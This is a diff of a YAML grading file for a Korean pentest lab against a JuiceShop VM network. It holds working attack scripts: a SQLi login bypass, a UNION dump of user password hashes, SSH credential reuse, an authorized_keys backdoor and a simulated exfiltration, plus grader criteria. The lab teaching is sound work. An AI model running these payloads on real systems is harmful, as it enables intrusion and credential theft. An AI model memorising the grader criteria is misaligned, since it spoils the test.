@@ -30,20 +30,22 @@ steps:
     expect: Nmap scan report
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 1 정찰 — 대상 네트워크 10.20.30.0/24 전체에 sudo nmap -sn (ping sweep)으로 활성 호스트 발견 → sudo nmap
+        -sV --top-ports 100 으로 각 호스트의 서비스/버전 탐지. --max-retries 1 --host-timeout 15s -T4 로 속도 최적화. 모의해킹
+        범위 내 자산 식별 → 포트 → 서비스 순서 체계적 기록
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - nmap -sn + nmap -sV 두 단계 스캔 모두 실행
+      - Nmap scan report 키워드 또는 서비스 탐지 결과 출력
+      - 10.20.30.0/24 또는 특정 서버 3개(1/80/100) 대상 명시
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - sudo nmap -sn + sudo nmap -sV -T4
+      - fping / nmap -PE/-PP/-PM 대체 ping
+      - masscan --rate 1000 + nmap -sV 2-stage
+      - rustscan + nmap NSE integration
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 단일 호스트만 스캔 (/24 범위 없음)
+      - 서비스 탐지 생략 (ping sweep 만)
+      - 기록/범위 언급 없음
   target_vm: attacker
   script: sudo nmap -sn 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 && echo '===== Service Detection
     =====' && sudo nmap -sV -T4 --max-retries 1 --host-timeout 15s --top-ports 100 10.20.30.1 10.20.30.80
@@ -68,20 +70,22 @@ steps:
     expect: Web Recon
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'Phase 1 웹 정찰 — JuiceShop(10.20.30.80:3000) 대상 5종 정찰: curl -sI 헤더(기술 스택·서버 버전) + /robots.txt(숨겨진
+        경로) + /ftp(디렉토리 리스팅) + /api/Products(API 엔드포인트·데이터) + python json.load 로 데이터 수 카운트. 후속 공격의 기반
+        정보 수집'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Web Recon 키워드 + 최소 3개 수집 포인트 (헤더/robots/ftp/API 중)
+      - curl + python JSON 파싱으로 구조화된 정보 추출
+      - 정찰 결과가 이후 공격 벡터 식별로 연결됨 명시
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -sI + curl -s /robots.txt + curl -s /api/...
+      - whatweb http://<target>:3000
+      - wappalyzer / wafw00f / nikto -Tuning=b
+      - gobuster dir -u <url> -w wordlist
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 정찰 포인트 2개 이하
+      - API/robots 같은 웹 특유 수집 누락
+      - 후속 공격과의 연결 언급 없음
   target_vm: attacker
   script: 'echo ''=== Web Recon ==='' && curl -sI http://10.20.30.80:3000 | head -10 && echo ''--- robots.txt
     ---'' && curl -s http://10.20.30.80:3000/robots.txt && echo ''--- /ftp ---'' && curl -s http://10.20.30.80:3000/ftp
@@ -106,20 +110,21 @@ steps:
     expect: Scan
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 2 자동 취약점 스캔 — nikto -h http://<web>:3000 -maxtime 60 로 웹 서버 취약점 + nmap --script vuln
+        -p 3000 NSE 스크립트로 네트워크 수준 취약점 교차 확인. 자동화 결과는 시작점, 오탐은 수동 검증 필요
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Nikto Scan + NSE Vuln Scan 두 도구 모두 실행
+      - 웹(nikto) + 네트워크(nmap NSE) 양쪽 수준 커버
+      - 자동 스캐너 결과 오탐 검증 필요 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - nikto -h + nmap --script vuln
+      - OWASP ZAP 자동 스캔
+      - sqlmap --level=5 --risk=3 auto 탐지
+      - acunetix / burp suite active scan
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 도구 1개만 사용 (교차 검증 없음)
+      - 오탐 검증 또는 수동 확인 언급 없음
+      - 스캔 결과 해석·우선순위 없음
   target_vm: attacker
   script: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail
     -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 --max-retries 1 --host-timeout
@@ -143,20 +148,22 @@ steps:
     expect: Admin token acquired
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'Phase 3 초기 접근 — SQLi 인증 우회 공격 /rest/user/login POST 에 {email: '' OR 1=1--, password: a}
+        JSON 페이로드로 관리자 JWT 토큰 탈취. python json.load 로 token 필드 파싱 후 ${TOKEN:0:50} 출력. CVSS 9.8 Critical
+        인증 우회 취약점 실증'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - /rest/user/login 또는 유사 인증 엔드포인트 POST
+      - ''' OR 1=1-- 또는 동등한 SQLi 페이로드 주입'
+      - Admin token acquired 또는 유사 성공 메시지 + JWT 토큰 일부 출력
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X POST + JSON body 에 SQLi
+      - sqlmap -u <url> --level=5 --risk=3 --technique=B
+      - Burp Repeater 로 페이로드 수동 테스트
+      - python requests 로 자동화
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - SQLi 페이로드 없이 정상 로그인
+      - JWT 토큰 추출 실패 또는 미검증
+      - CVSS 평가/Critical 등급 언급 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"\'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
@@ -180,20 +187,22 @@ steps:
     expect: '@'
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 3 데이터 추출 — UNION 기반 SQLi 공격 /rest/products/search?q=test')%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--
+        로 Users 테이블 email/password 해시 추출. python json.load 로 name/description 필드 파싱 후 이메일 @ 포함 행 확인. 오프라인
+        해시 크래킹으로 평문 복원 가능
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - UNION SELECT email, password FROM Users 또는 동등한 payload
+      - '@ 포함된 이메일 문자열이 응답에 노출'
+      - 오프라인 해시 크래킹으로 평문 복원 가능성 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl + URL-encoded UNION SQLi
+      - sqlmap -u <url> --dump -T Users
+      - python requests 로 iterate 후 데이터 수집
+      - Burp Repeater + 컬럼 수 매칭
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - UNION 없이 기본 쿼리만
+      - Users 테이블 접근 실패
+      - 해시 크래킹 후속 단계 언급 없음
   target_vm: attacker
   script: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--''
     2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"{p.get(''name'','''')}:
@@ -215,20 +224,21 @@ steps:
     expect: Lateral movement
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 4 측면 이동 — 자격 증명 재사용 공격. ssh ccc@web 에서 동일 비밀번호로 ssh ccc@secu 로 중첩 접속 (ssh ccc@10.20.30.80
+        'ssh ccc@10.20.30.1 hostname && id'). 성공 시 web→secu 경로 확보. 한 시스템의 비밀번호 노출이 도메인 전체로 확산되는 실전 패턴
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh 중첩 접속 (웹→secu) 또는 동등한 측면 이동 명령
+      - Lateral movement 키워드 + 성공 메시지
+      - 자격 증명 재사용이 측면 이동의 주요 벡터임을 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh ccc@<web> ssh ccc@<secu> 중첩 접속
+      - sshpass -p <pwd> ssh (비밀번호 명시 재사용)
+      - crackmapexec smb <IPrange> -u <user> -p <pwd>
+      - impacket psexec / wmiexec 재사용
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 단일 호스트 접속만 (측면 이동 없음)
+      - 자격 증명 재사용 개념 설명 없음
+      - 실제 secu 서버 접근 증명(hostname/id) 누락
   target_vm: attacker
   script: 'ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 "hostname && id" 2>/dev/null'' 2>/dev/null && echo
     ''=== Lateral movement: web -> secu SUCCESS ==='''
@@ -251,20 +261,21 @@ steps:
     expect: sudo
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'Phase 4 권한 상승 벡터 열거 — web 서버에서 4가지 벡터 일괄 검사: sudo -l(허용 명령)·find / -perm -4000(SUID 바이너리)·getcap
+        -r /(capability 설정 파일)·ls -la /etc/cron.d/(cron 작업 권한). 모든 벡터를 체계적으로 확인해 가장 확실한 권한 상승 경로 선택'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sudo + SUID + capabilities + cron 최소 3개 벡터 검사
+      - ssh 로 원격 대상(web 서버)에서 실행
+      - sudo 또는 유사 키워드 포함 출력
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - sudo -l + find -perm -4000 + getcap + ls /etc/cron.d
+      - linpeas.sh 자동 열거
+      - linux-exploit-suggester.sh
+      - pspy 로 프로세스/cron 모니터링
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 벡터 2개 이하만 검사
+      - 결과 해석 또는 우선순위 선정 없음
+      - 로컬(attacker)에서만 검사 — 원격 VM 대상 아님
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'echo "=== sudo ==="; echo 1 | sudo -S -l 2>/dev/null | tail -5; echo "===
     SUID ==="; find / -perm -4000 -type f 2>/dev/null | head -10; echo "=== Capabilities ==="; getcap
@@ -289,20 +300,22 @@ steps:
     expect: Persistence established
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 5 지속성 — ssh-keygen -t ed25519 로 공격자 ed25519 키 생성 → 공개키를 web 서버의 ~/.ssh/authorized_keys
+        에 추가 → ssh -i /tmp/pentest_key 로 비밀번호 없이 재접속 확인. 비밀번호 변경 후에도 유지되는 키 기반 백도어. 실전 모의해킹에서는 합의된 범위
+        내 + 테스트 종료 후 완전 제거 원칙
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh-keygen 으로 키 생성 + authorized_keys 에 추가
+      - Persistence established 또는 키 기반 재접속 성공 메시지
+      - 테스트 종료 후 백도어 제거 원칙 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh-keygen -t ed25519 + cat pub | ssh target cat >> authorized_keys
+      - cron 이용 reverse shell 백도어
+      - systemd service 로 지속성
+      - webshell 업로드 (웹 서버 권한 범위)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 키 생성만 하고 설치 안 함
+      - 재접속 검증 없음 — 설치만
+      - 정리(cleanup) 원칙 언급 없음
   target_vm: attacker
   script: 'ssh-keygen -t ed25519 -f /tmp/pentest_key -N '''' -q 2>/dev/null && cat /tmp/pentest_key.pub
     | ssh ccc@10.20.30.80 ''mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/pentest_key
@@ -330,20 +343,22 @@ steps:
     expect: Exfiltration simulation
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'Phase 5 데이터 유출 시뮬레이션 — /api/Users 에서 사용자 이메일 수집 → /tmp/pentest_exfil.txt 저장 → openssl enc
+        -aes-256-cbc -pbkdf2 -pass pass:<key> 로 AES-256-CBC 암호화 → /tmp/pentest_exfil.enc 생성 → 원본/암호화 크기
+        비교 + curl -X POST 전송 명령 출력 (실제 전송은 안 함). 실전: 청크 분할 + 정상 채널 위장'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 데이터 수집 → AES/OpenSSL 암호화 → 전송 명령 3단계 모두 시연
+      - Exfiltration simulation 키워드 + 원본/암호화 크기 비교
+      - 실제 외부 전송은 하지 않고 가능성만 입증
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl + openssl enc -aes-256-cbc -pbkdf2
+      - gpg --symmetric --cipher-algo AES256
+      - tar.gz + split -b 1M 청크 분할
+      - DNS tunneling (dnscat2) 정상 채널 위장
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 평문 그대로 전송 (암호화 없음)
+      - 전송 채널/명령 언급 없이 파일 저장만
+      - 실전 탐지 회피(청크·채널 위장) 없음
   target_vm: attacker
   script: 'curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u[''email''])
     for u in json.load(sys.stdin)[''data'']]" > /tmp/pentest_exfil.txt 2>/dev/null && openssl enc -aes-256-cbc
@@ -370,20 +385,22 @@ steps:
     expect: ===
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 6 방어 체계 탐지 검증 — ssh ccc@secu (10.20.30.1) 로 /var/log/suricata/fast.log tail + sshpass
+        ssh ccc@siem (10.20.30.100) /var/ossec/logs/alerts/alerts.log tail 로 Wazuh alert 조회. 이번 모의해킹 활동(SQLi/SSH/UNION)이
+        탐지됐는지 교차 확인해 방어 체계 gap 식별
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Suricata fast.log + Wazuh alerts.log 두 로그 모두 조회
+      - === 구분자 또는 Suricata/Wazuh 키워드 포함
+      - 탐지되지 않은 공격은 보안 갭 의미 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh ccc@secu tail fast.log + ssh ccc@siem tail ossec alerts
+      - Elasticsearch/Kibana 질의로 alert 조회
+      - Wazuh dashboard GUI 로 이벤트 검색
+      - SIEM 의 SIGMA 룰 기반 검색
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 한쪽 로그만 조회 (Suricata OR Wazuh 단독)
+      - 보안 갭/탐지 실패 분석 없음
+      - 모의해킹 활동과 로그 상관 분석 없음
   target_vm: attacker
   script: echo '=== Suricata Alerts ===' && ssh ccc@10.20.30.1 'tail -10 /var/log/suricata/fast.log 2>/dev/null'
     2>/dev/null && echo '=== Wazuh Alerts ===' && sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100
@@ -411,20 +428,23 @@ steps:
     expect: Vulnerability Classification
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'Phase 7 취약점 CVSS 분류 — 발견된 10개 취약점을 CVSS 3.1 점수 + OWASP Top 10 매핑 표로 정리: SQLi login bypass
+        9.8 Critical A03, UNION SQLi 9.1 Critical A03, User API 노출 7.5 High A01, SSH 자격 증명 재사용 8.1 High
+        A07, rate limiting 7.3 High A07, XSS 6.1 Medium A03, 디렉토리 리스팅 5.3, 보안 헤더 5.0, 버전 노출 5.0, verbose
+        에러 4.3'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - CVSS 점수 + Critical/High/Medium/Low 심각도 분류
+      - OWASP Top 10 매핑(A01/A03/A05/A07) 포함
+      - 최소 8개 취약점 분류 (이 모의해킹의 주요 발견 전부)
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -e 로 markdown 표 출력
+      - nvd.nist.gov calculator 점수 계산
+      - FIRST.org CVSS 3.1 spec 참조
+      - vulndb / cvedetails 인용
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - CVSS 점수 없이 심각도만
+      - OWASP 매핑 누락
+      - 취약점 5개 이하만 분류
   target_vm: attacker
   script: 'echo -e ''=== Vulnerability Classification ===\n\n| # | Vulnerability | CVSS | Severity | OWASP
     |\n|---|-------------|------|----------|-------|\n| 1 | SQL Injection (login bypass) | 9.8 | Critical
@@ -457,20 +477,23 @@ steps:
     expect: Attack Path Diagram
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'Phase 7 ASCII 공격 경로 다이어그램 — Attacker(10.20.30.201) → Web(10.20.30.80) {SQLi login bypass→Admin
+        JWT, UNION→User DB, XSS→세션 탈취} → 자격 증명 재사용으로 Secu(10.20.30.1) 및 SIEM(10.20.30.100) 측면 이동. 최종 영향:
+        JuiceShop 전체 관리자 접근·자격 증명 전수 탈취·인프라 접근·모니터링 우회. 경영진 이해를 위한 시각적 공격 흐름'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Attack Path Diagram 키워드 + ASCII 다이어그램 포맷
+      - 최소 3개 서버 (Web/Secu/SIEM) 경로 표시
+      - 각 단계의 획득 접근(JWT·DB·설정) 명시
+      - Impact 섹션에 최종 영향 요약
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -e 로 ASCII art 다이어그램
+      - graphviz dot 로 시각화 (텍스트 소스)
+      - PlantUML sequence diagram (텍스트)
+      - mermaid.js graph TD 구문
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 선형 순서만 — 분기·계층 구조 없음
+      - 각 단계의 결과(획득 접근) 누락
+      - Impact/영향 요약 없음
   target_vm: attacker
   script: 'echo -e ''=== Attack Path Diagram ===\n\n[Attacker: attacker 10.20.30.201]\n        |\n        |
     (1) Recon: nmap scan\n        v\n[Web Server: 10.20.30.80]\n   |    |    |\n   |    |    +-- (2) SQLi
@@ -502,20 +525,23 @@ steps:
     - 정리
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 8 아티팩트 정리(cleanup) — 로컬 /tmp/pentest_key·pentest_exfil.txt·pentest_exfil.enc 제거 +
+        ssh 로 원격 web 서버의 ~/.ssh/authorized_keys 에서 pentest 패턴 sed 삭제 + /tmp/.hidden_backdoor 디렉토리 제거.
+        모의해킹 종료 후 시스템 원래 상태 복원, 백도어 잔존 절대 금지는 전문 테스터의 의무
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Local artifacts + Remote backdoors 양쪽 모두 정리
+      - rm -f 또는 sed -i 로 실제 제거 명령 실행
+      - Cleanup complete 또는 정리 키워드
+      - cleanup 의 전문 윤리적 의무임을 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - rm -f + ssh sed -i /pentest/d
+      - ansible playbook 으로 일괄 정리
+      - chef/puppet 으로 상태 복원
+      - 수동 체크리스트 기반 검증
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 로컬 또는 원격 한쪽만 정리
+      - 제거 명령 없이 목록만
+      - 윤리적 의무 언급 없음
   target_vm: attacker
   script: echo '=== Cleanup ===' && rm -f /tmp/pentest_key /tmp/pentest_key.pub /tmp/pentest_exfil.txt
     /tmp/pentest_exfil.enc && echo 'Local artifacts removed' && sshpass -p1 ssh -o StrictHostKeyChecking=no
@@ -543,20 +569,22 @@ steps:
     expect: Remediation Recommendations
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 8 보안 강화 권고 — 발견 취약점을 CRITICAL(SQLi 수정 parameterized queries·ORM·WAF, User API 인증/민감
+        필드 제외) / HIGH(SSH 서버별 고유 비밀번호·키 기반 인증, Rate Limiting 5회/분·계정 잠금) / MEDIUM(보안 헤더·에러 최소화·디렉토리 리스팅·정기
+        스캔) 우선순위로 구분 + 조치 기한(1주/1개월/3개월)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Critical/High/Medium 3단계 우선순위 구분
+      - 각 우선순위별 조치 기한 (1주/1개월/3개월 등)
+      - 구체적인 기술 조치 (parameterized queries·rate limit·키 기반 인증) 최소 4개
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -e 로 우선순위별 섹션 출력
+      - OWASP Cheat Sheet Series 참조
+      - CIS Benchmark 기반 권고
+      - ISO 27001 통제 매핑
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 우선순위 구분 없이 나열만
+      - 기한·타임라인 없음
+      - 조치가 추상적 (구체 기술 없음)
   target_vm: attacker
   script: echo -e '=== Remediation Recommendations ===\n\n[CRITICAL - 즉시 조치 (1주 이내)]\n1. SQL Injection
     수정\n   - Parameterized queries/Prepared statements 적용\n   - ORM 사용 (Sequelize, SQLAlchemy)\n   - WAF
@@ -592,20 +620,24 @@ steps:
     expect: PENETRATION TEST REPORT
     field: stdout
     semantic:
-      intent: 종합 모의해킹 (Full Pentest) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Phase 9 최종 Executive Summary 보고서 /tmp/pentest_final_report.txt — Date·Scope(10.20.30.0/24
+        4 servers)·Testers·Classification·Overall Risk HIGH + 주요 발견(DB 전체 침해·완전 측면 이동·지속 접근·데이터 유출) +
+        Statistics(Critical 2·High 3·Medium 4·Low 1) + Top 3 Recommendations(SQLi 수정·고유 비밀번호+SSH 키·API
+        인증) + Conclusion. 경영진 중심 간결 요약 (기술 세부는 부록)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - /tmp/pentest_final_report.txt 파일 생성 및 cat 출력
+      - PENETRATION TEST REPORT + Executive Summary 키워드
+      - Statistics·Top Recommendations·Conclusion 섹션
+      - Overall Risk 등급 + 수치 기반 발견 통계
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -e ... > /tmp/pentest_final_report.txt && cat
+      - heredoc 로 멀티라인 보고서 작성
+      - pandoc 으로 markdown → PDF 변환 (언급만)
+      - dradis / faraday pentest report 플랫폼
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(종합 모의해킹 (Full Pentest))와 무관한 기법
+      - 파일 미생성
+      - Executive Summary 없이 기술 세부만
+      - 경영진 관점의 요약·우선 권고 누락
   target_vm: attacker
   script: 'echo -e ''=== PENETRATION TEST REPORT ===\n=== Executive Summary ===\n\nDate: 2026-04-03\nScope:
     10.20.30.0/24 (4 servers)\nTesters: Security Lab Student\nClassification: Confidential\n\n[Overall
